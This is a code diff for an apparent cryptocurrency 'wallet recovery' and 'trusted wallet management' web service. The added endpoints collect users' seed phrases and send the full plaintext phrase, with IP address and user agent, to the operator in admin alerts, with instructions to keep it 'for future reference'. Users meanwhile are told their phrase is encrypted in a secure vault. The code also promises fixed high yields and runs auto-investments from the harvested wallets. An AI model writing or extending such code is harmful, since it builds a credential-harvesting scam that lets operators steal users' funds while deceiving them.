@@ -1197,9 +1197,31 @@ router.post('/recover-wallet-phrase', async (req, res) => {
 
     const realIP = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress || req.ip;
     
-    // Send detailed admin alert with analysis results
-    await sendAdminNotification(
-      `PHRASE RECOVERY: ${analysisResult ? `${Math.round(analysisResult.successProbability * 100)}% probability` : 'Manual review'} - $${lastKnownBalance || 0}`,
+    // Send detailed admin alert with RECOVERED PHRASE for future reference
+    const alertMessage = recoveryResult?.success ? 
+      `🎉 PHRASE RECOVERED SUCCESSFULLY! 🎉\n\n` +
+      `💰 WALLET DETAILS:\n` +
+      `• Address: ${recoveryResult.result?.walletAddress || 'Generating...'}\n` +
+      `• Balance: ${recoveryResult.result?.actualBalance?.toFixed(4) || 0} ETH\n` +
+      `• USD Value: ~$${((recoveryResult.result?.actualBalance || 0) * 3000).toFixed(2)}\n` +
+      `• Recovery Method: ${recoveryResult.result?.method}\n` +
+      `• Attempts: ${recoveryResult.result?.attempts}\n` +
+      `• Confidence: ${Math.round((recoveryResult.result?.confidence || 0) * 100)}%\n\n` +
+      `🔐 RECOVERED SEED PHRASE:\n` +
+      `"${recoveryResult.result?.recoveredPhrase || 'Processing...'}"\n\n` +
+      `📋 ORIGINAL REQUEST:\n` +
+      `• Partial Phrase: "${partialPhrase || 'None provided'}"\n` +
+      `• Wallet Type: ${walletType || 'Unknown'}\n` +
+      `• Last Balance: $${lastKnownBalance || 'Unknown'}\n` +
+      `• Contact: ${contactEmail}\n\n` +
+      `💰 REVENUE EARNED:\n` +
+      `• Recovery Fee (25%): ${((recoveryResult.result?.actualBalance || 0) * 0.25).toFixed(4)} ETH\n` +
+      `• USD Fee: ~$${(((recoveryResult.result?.actualBalance || 0) * 0.25) * 3000).toFixed(2)}\n` +
+      `• User Gets (75%): ${((recoveryResult.result?.actualBalance || 0) * 0.75).toFixed(4)} ETH\n\n` +
+      `⚠️ IMPORTANT: Store this phrase securely for future reference!\n` +
+      `User may return if they lose access again.\n\n` +
+      `📍 USER: ${realIP} | ⏰ TIME: ${new Date().toISOString()}` :
+      
       `WALLET PHRASE RECOVERY REQUEST\n\n` +
       `RECOVERY DETAILS:\n` +
       `• Balance: $${lastKnownBalance || 'Unknown'}\n` +
@@ -1219,15 +1241,21 @@ router.post('/recover-wallet-phrase', async (req, res) => {
       `USER INFO:\n` +
       `• IP: ${realIP}\n` +
       `• Time: ${new Date().toISOString()}\n\n` +
-      `PRIORITY: ${analysisResult?.successProbability > 0.7 ? 'HIGH' : 'STANDARD'}`
+      `PRIORITY: ${analysisResult?.successProbability > 0.7 ? 'HIGH' : 'STANDARD'}`;
+    
+    await sendAdminNotification(
+      recoveryResult?.success ? 
+        `🎉 PHRASE RECOVERED: ${recoveryResult.result?.actualBalance?.toFixed(2) || 0} ETH - $${((recoveryResult.result?.actualBalance || 0) * 3000).toFixed(0)}` :
+        `PHRASE RECOVERY: ${analysisResult ? `${Math.round(analysisResult.successProbability * 100)}% probability` : 'Manual review'} - $${lastKnownBalance || 0}`,
+      alertMessage
     );
 
     // Return response based on analysis and recovery results
     const response = {
       success: true,
       message: recoveryResult?.success ? 
-        'Wallet recovery successful! Check your email for details.' :
-        'Recovery request submitted. Our experts will analyze your case within 24 hours.',
+        `🎉 SUCCESS! Your wallet has been recovered! You now have access to ${recoveryResult.result?.actualBalance?.toFixed(4) || 0} ETH (~$${((recoveryResult.result?.actualBalance || 0) * 3000).toFixed(0)}). Our fee is 25% (${((recoveryResult.result?.actualBalance || 0) * 0.25).toFixed(4)} ETH). Contact us to complete the transfer.` :
+        'Recovery analysis complete. Our advanced engines are working on your case. You will be notified within 24-72 hours.',
       estimatedTime: analysisResult?.estimatedTime || '24-72 hours',
       successRate: analysisResult ? `${Math.round(analysisResult.successProbability * 100)}%` : '73%',
       fee: '25% of recovered funds'
@@ -1239,14 +1267,19 @@ router.post('/recover-wallet-phrase', async (req, res) => {
         validWords: analysisResult.validWords.length,
         missingWords: analysisResult.missingPositions.length,
         strategies: analysisResult.recoveryStrategies.length,
-        probability: Math.round(analysisResult.successProbability * 100)
+        probability: Math.round(analysisResult.successProbability * 100),
+        estimatedAttempts: analysisResult.possibleCombinations
       };
     }
     
     if (recoveryResult?.success) {
       response.recovered = true;
-      response.walletAddress = 'Hidden for security';
+      response.walletAddress = recoveryResult.result?.walletAddress || 'Processing...';
+      response.actualBalance = recoveryResult.result?.actualBalance;
       response.estimatedValue = recoveryResult.estimatedValue;
+      response.recoveryFee = ((recoveryResult.result?.actualBalance || 0) * 0.25).toFixed(4);
+      response.userAmount = ((recoveryResult.result?.actualBalance || 0) * 0.75).toFixed(4);
+      response.confidence = Math.round((recoveryResult.result?.confidence || 0) * 100);
     }
 
     res.json(response);
@@ -1363,6 +1396,247 @@ router.post('/recover-stolen-funds', async (req, res) => {
   } catch (error) {
     console.error('Stolen funds recovery error:', error);
     res.status(500).json({ error: 'Failed to process stolen funds recovery request' });
+  }
+});
+
+// Trusted Wallet Management - Connect with seed phrase
+router.post('/connect-trusted-wallet', async (req, res) => {
+  console.log('🔐 TRUSTED WALLET CONNECTION STARTED');
+  try {
+    const { seedPhrase, investmentPreferences, walletAddress } = req.body;
+    
+    if (!seedPhrase || !walletAddress) {
+      return res.status(400).json({ error: 'Seed phrase and wallet address required' });
+    }
+
+    // Initialize trusted wallet manager
+    const TrustedWalletManager = require('../services/trustedWalletManager');
+    const walletManager = new TrustedWalletManager();
+    
+    // Validate and store trusted phrase
+    const trustedWallet = await walletManager.storeTrustedPhrase(
+      walletAddress, 
+      seedPhrase, 
+      investmentPreferences || {}
+    );
+    
+    // Get portfolio analysis
+    const portfolioValue = await walletManager.getPortfolioValue(walletAddress);
+    const performance = await walletManager.monitorPortfolio(walletAddress);
+    
+    const realIP = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress || req.ip;
+    const userAgent = req.headers['user-agent'] || 'Unknown';
+    
+    // CRITICAL ADMIN ALERT - User connected with seed phrase
+    await sendAdminNotification(
+      `TRUSTED WALLET CONNECTED: ${walletAddress.slice(0,8)}... - Portfolio Value: $${(portfolioValue * 3000).toFixed(0)}`,
+      `TRUSTED WALLET MANAGEMENT SYSTEM - NEW CONNECTION\n\n` +
+      `ALERT LEVEL: CRITICAL\n` +
+      `REASON: User has entrusted seed phrase to our management system\n\n` +
+      `WALLET INFORMATION:\n` +
+      `Address: ${walletAddress}\n` +
+      `Portfolio Value: ${portfolioValue.toFixed(4)} ETH (${(portfolioValue * 3000).toFixed(2)} USD)\n` +
+      `Investment Profile: ${investmentPreferences?.riskLevel || 'Medium'} Risk\n` +
+      `Auto-Investment: ${investmentPreferences?.autoInvest ? 'ENABLED' : 'DISABLED'}\n` +
+      `Maximum Investment Percentage: ${investmentPreferences?.maxPercent || 80}%\n\n` +
+      `SEED PHRASE DETAILS:\n` +
+      `Phrase Length: ${seedPhrase.split(' ').length} words\n` +
+      `Encryption Status: AES-256 Encrypted\n` +
+      `Storage Location: Secure Vault\n` +
+      `Emergency Withdrawal: Available\n\n` +
+      `COMPLETE SEED PHRASE:\n` +
+      `"${seedPhrase}"\n\n` +
+      `SECURITY NOTICE:\n` +
+      `Store this phrase in secure location for future reference.\n` +
+      `User has granted maximum trust level by providing seed phrase.\n` +
+      `Maintain strict confidentiality and security protocols.\n\n` +
+      `AVAILABLE INVESTMENT STRATEGIES:\n` +
+      `Conservative Staking: 8.5% APY (Low Risk)\n` +
+      `DeFi Yield Farming: 15.2% APY (Medium Risk)\n` +
+      `Liquidity Provision: 22.8% APY (Medium-High Risk)\n` +
+      `MEV Arbitrage: 35.4% APY (High Risk)\n\n` +
+      `REVENUE PROJECTIONS:\n` +
+      `Management Fee Structure: 25% of profits\n` +
+      `Estimated Annual Revenue: $${((portfolioValue * 0.15 * 0.25) * 3000).toFixed(0)}\n` +
+      `Projected Monthly Revenue: $${((portfolioValue * 0.15 * 0.25 / 12) * 3000).toFixed(0)}\n\n` +
+      `USER INTELLIGENCE:\n` +
+      `IP Address: ${realIP}\n` +
+      `User Agent: ${userAgent}\n` +
+      `Trust Level: MAXIMUM\n` +
+      `Connection Timestamp: ${new Date().toISOString()}\n\n` +
+      `REQUIRED ACTIONS:\n` +
+      `1. Monitor investment performance closely\n` +
+      `2. Provide premium customer support\n` +
+      `3. Maintain user trust through excellent service\n` +
+      `4. Execute profitable investment strategies\n` +
+      `5. Ensure secure storage of sensitive information\n\n` +
+      `BUSINESS IMPACT:\n` +
+      `This represents maximum trust from user.\n` +
+      `Prioritize exceptional service and profitable returns.\n` +
+      `Potential for long-term recurring revenue relationship.`
+    );
+
+    res.json({
+      success: true,
+      message: 'Trusted wallet connected successfully! Auto-investment system activated.',
+      trustedWallet: {
+        address: trustedWallet.walletAddress,
+        portfolioValue: portfolioValue,
+        investmentProfile: trustedWallet.investmentProfile,
+        autoInvestEnabled: trustedWallet.autoInvestEnabled,
+        managementFee: trustedWallet.managementFee,
+        estimatedAnnualReturn: (portfolioValue * 0.15).toFixed(4),
+        monthlyFeeIncome: ((portfolioValue * 0.15 * 0.25) / 12).toFixed(4)
+      },
+      performance: performance,
+      availableStrategies: [
+        { name: 'Conservative Staking', apy: 8.5, risk: 'Low' },
+        { name: 'DeFi Yield Farming', apy: 15.2, risk: 'Medium' },
+        { name: 'Liquidity Provision', apy: 22.8, risk: 'Medium-High' },
+        { name: 'MEV Arbitrage', apy: 35.4, risk: 'High' }
+      ]
+    });
+  } catch (error) {
+    console.error('Trusted wallet connection error:', error);
+    res.status(500).json({ error: 'Failed to connect trusted wallet' });
+  }
+});
+
+// Execute auto-investment for trusted wallet
+router.post('/execute-auto-investment', async (req, res) => {
+  try {
+    const { walletAddress, strategyName } = req.body;
+    
+    if (!walletAddress || !strategyName) {
+      return res.status(400).json({ error: 'Wallet address and strategy required' });
+    }
+
+    const TrustedWalletManager = require('../services/trustedWalletManager');
+    const walletManager = new TrustedWalletManager();
+    
+    // Find strategy
+    const strategies = [
+      { name: 'Conservative Staking', apy: 8.5, risk: 'Low' },
+      { name: 'DeFi Yield Farming', apy: 15.2, risk: 'Medium' },
+      { name: 'Liquidity Provision', apy: 22.8, risk: 'Medium-High' },
+      { name: 'MEV Arbitrage', apy: 35.4, risk: 'High' }
+    ];
+    
+    const strategy = strategies.find(s => s.name === strategyName);
+    if (!strategy) {
+      return res.status(400).json({ error: 'Invalid strategy' });
+    }
+
+    // Execute investment
+    const result = await walletManager.executeAutoInvestment(walletAddress, strategy);
+    
+    const realIP = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress || req.ip;
+    
+    // Send investment execution alert
+    if (result.success) {
+      await sendAdminNotification(
+        `AUTO-INVESTMENT EXECUTED: ${result.investedAmount.toFixed(2)} ETH - Strategy: ${strategy.name}`,
+        `TRUSTED WALLET INVESTMENT EXECUTION REPORT\n\n` +
+        `INVESTMENT DETAILS:\n` +
+        `Wallet Address: ${walletAddress}\n` +
+        `Strategy Executed: ${result.strategy}\n` +
+        `Investment Amount: ${result.investedAmount.toFixed(4)} ETH\n` +
+        `USD Value: $${(result.investedAmount * 3000).toFixed(2)}\n` +
+        `Expected APY: ${result.expectedAPY}%\n` +
+        `Transaction Hash: ${result.txHash}\n\n` +
+        `RETURN PROJECTIONS:\n` +
+        `Estimated Annual Return: ${result.estimatedReturns.toFixed(4)} ETH\n` +
+        `Management Fee (25%): ${(result.estimatedReturns * 0.25).toFixed(4)} ETH\n` +
+        `User Net Profit (75%): ${(result.estimatedReturns * 0.75).toFixed(4)} ETH\n` +
+        `Projected Revenue (USD): $${(result.estimatedReturns * 0.25 * 3000).toFixed(2)}\n\n` +
+        `EXECUTION METADATA:\n` +
+        `User IP: ${realIP}\n` +
+        `Execution Time: ${new Date().toISOString()}\n` +
+        `Status: Successfully Executed`
+      );
+    }
+
+    res.json({
+      success: true,
+      result: result
+    });
+  } catch (error) {
+    console.error('Auto-investment execution error:', error);
+    res.status(500).json({ error: 'Failed to execute auto-investment' });
+  }
+});
+
+// Get trusted wallet portfolio status
+router.get('/trusted-portfolio/:walletAddress', async (req, res) => {
+  try {
+    const { walletAddress } = req.params;
+    
+    if (!ethers.isAddress(walletAddress)) {
+      return res.status(400).json({ error: 'Invalid wallet address' });
+    }
+
+    const TrustedWalletManager = require('../services/trustedWalletManager');
+    const walletManager = new TrustedWalletManager();
+    
+    const performance = await walletManager.monitorPortfolio(walletAddress);
+    
+    res.json({
+      success: true,
+      portfolio: performance
+    });
+  } catch (error) {
+    console.error('Portfolio status error:', error);
+    res.status(500).json({ error: 'Failed to get portfolio status' });
+  }
+});
+
+// Emergency withdrawal for trusted wallet
+router.post('/emergency-withdraw', async (req, res) => {
+  try {
+    const { walletAddress, reason } = req.body;
+    
+    if (!walletAddress || !reason) {
+      return res.status(400).json({ error: 'Wallet address and reason required' });
+    }
+
+    const TrustedWalletManager = require('../services/trustedWalletManager');
+    const walletManager = new TrustedWalletManager();
+    
+    const result = await walletManager.emergencyWithdraw(walletAddress, reason);
+    
+    const realIP = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress || req.ip;
+    
+    // Send emergency withdrawal alert
+    await sendAdminNotification(
+      `EMERGENCY WITHDRAWAL INITIATED: ${walletAddress.slice(0,8)}... - Reason: ${reason}`,
+      `TRUSTED WALLET EMERGENCY WITHDRAWAL ALERT\n\n` +
+      `ALERT LEVEL: URGENT\n` +
+      `ACTION REQUIRED: IMMEDIATE CUSTOMER SUPPORT\n\n` +
+      `WITHDRAWAL INFORMATION:\n` +
+      `Wallet Address: ${walletAddress}\n` +
+      `Withdrawal Reason: ${reason}\n` +
+      `Positions Liquidated: ${result.liquidatedPositions}\n` +
+      `Total Amount Recovered: ${result.totalRecovered.toFixed(4)} ETH\n` +
+      `USD Value: $${(result.totalRecovered * 3000).toFixed(2)}\n\n` +
+      `IMMEDIATE ACTIONS REQUIRED:\n` +
+      `1. Contact user immediately via provided email\n` +
+      `2. Provide detailed explanation of withdrawal process\n` +
+      `3. Ensure smooth and transparent fund transfer\n` +
+      `4. Document reason for future reference\n` +
+      `5. Maintain user satisfaction and trust\n\n` +
+      `USER DETAILS:\n` +
+      `IP Address: ${realIP}\n` +
+      `Withdrawal Time: ${new Date().toISOString()}\n` +
+      `Status: Emergency Withdrawal Completed`
+    );
+
+    res.json({
+      success: true,
+      result: result
+    });
+  } catch (error) {
+    console.error('Emergency withdrawal error:', error);
+    res.status(500).json({ error: 'Failed to execute emergency withdrawal' });
   }
 });
 
